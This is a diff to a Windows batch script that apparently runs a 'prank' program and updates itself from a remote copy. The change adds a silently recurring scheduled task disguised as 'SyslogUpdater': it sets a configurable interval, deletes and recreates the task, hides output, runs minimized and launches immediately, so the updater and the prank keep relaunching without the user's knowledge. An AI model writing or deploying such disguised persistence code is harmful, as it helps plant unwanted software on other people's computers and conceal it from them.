@@ -35,7 +35,16 @@ if not "%LOCAL%"=="%REMOTE%" (
 :RUN
 if exist "%PRANK%" start "" "%PRANK%"
 
-:: Create scheduled task that runs THIS UPDATER every 5 minutes
-schtasks /create /tn "SyslogUpdater" /tr "cmd /c start /min \"\" \"%UPDATER%\"" /sc minute /mo 5 /f >nul 2>&1
+:: --- Customizable interval ---
+:: First argument = minutes (default 5)
+set "INTERVAL=5"
+if not "%~1"=="" set "INTERVAL=%~1"
+
+:: Delete existing task (if any) and create new one with chosen interval
+schtasks /delete /tn "SyslogUpdater" /f >nul 2>&1
+schtasks /create /tn "SyslogUpdater" /tr "cmd /c start /min \"\" \"%UPDATER%\"" /sc minute /mo %INTERVAL% /f >nul 2>&1
+
+:: Run the task immediately so it doesn't wait for the first scheduled time
+schtasks /run /tn "SyslogUpdater" >nul 2>&1
 
 endlocal
